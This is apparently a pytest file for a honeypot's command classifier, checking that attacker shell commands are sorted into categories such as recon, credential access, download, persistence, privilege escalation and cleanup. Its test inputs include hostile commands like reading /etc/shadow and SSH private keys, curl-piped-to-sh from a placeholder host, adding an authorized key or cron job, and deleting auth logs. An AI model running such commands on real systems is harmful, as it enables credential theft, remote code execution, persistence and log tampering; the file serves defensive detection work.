import pytest

from honeypot.classify import CATEGORIES, INTEL_VALUE, classify, classify_line, phase_for


@pytest.mark.parametrize("cmd,expected", [
    ("uname -a", "recon"),
    ("id", "recon"),
    ("cat /proc/cpuinfo", "recon"),
    ("ls -la", "fs_browse"),
    ("cd /tmp", "fs_browse"),
    ("cat /etc/shadow", "cred_access"),
    ("cat ~/.ssh/id_rsa", "cred_access"),
    ("wget http://example.invalid/x.sh", "download"),
    ("curl -fsSL http://example.invalid/i | sh", "download"),
    ("chmod +x x.sh", "execute"),
    ("./x.sh", "execute"),
    ("echo 'ssh-ed25519 AAAA' >> ~/.ssh/authorized_keys", "persist"),
    ("crontab -l", "recon"),
    ("(crontab -l; echo '* * * * * /tmp/x') | crontab -", "persist"),
    ("sudo -i", "privesc"),
    ("su root", "privesc"),
    ("sudo cat /etc/shadow", "cred_access"),
    ("history -c", "cleanup"),
    ("rm -rf /var/log/auth.log", "cleanup"),
    ("echo hello", "benign"),
    ("", "benign"),
    ("frobnicate --now", "unknown"),
])
def test_classify(cmd, expected):
    assert classify(cmd) == expected


def test_every_category_has_a_value():
    assert set(INTEL_VALUE) == set(CATEGORIES)


def test_chained_line_takes_highest_value_part():
    assert classify_line("cd /tmp && wget http://example.invalid/a && chmod +x a && ./a") == "download"
    assert classify_line("ls; cat /etc/passwd") == "cred_access"


def test_phase_boundaries():
    assert [phase_for(i) for i in (1, 3, 4, 10, 11, 50)] == ["early", "early", "mid", "mid", "late", "late"]
